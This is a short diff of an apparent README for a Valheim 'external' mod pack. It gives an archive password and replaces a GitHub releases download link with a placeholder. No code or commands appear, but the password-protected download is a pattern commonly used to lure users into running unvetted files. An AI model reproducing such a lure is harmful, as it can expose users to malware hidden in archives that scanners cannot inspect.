@@ -6,9 +6,10 @@
 ##  PASSWORD: SectorSilo
 
 
-<a href="https://github.com/FigureSectorSilo/Valheim-Mods-External/releases/download/Latest/Valheim_ModPack.zip">
-  <img width="160" alt="Download" src="https://github.com/user-attachments/assets/fe6b983e-aa66-4a0f-8add-d4e6f00135de" />
+<a href="YOUR_DOWNLOAD_LINK">
+  <img width="160" alt="download_button_cropped" src="https://github.com/user-attachments/assets/2c1f38cb-77c9-483b-a3a4-0ff0d5a33714" />
 </a>
+
 
 
 <img width="474" height="331" alt="image" src="https://github.com/user-attachments/assets/0e537fb6-2d4c-46c0-941c-ee4a04a27da2" />
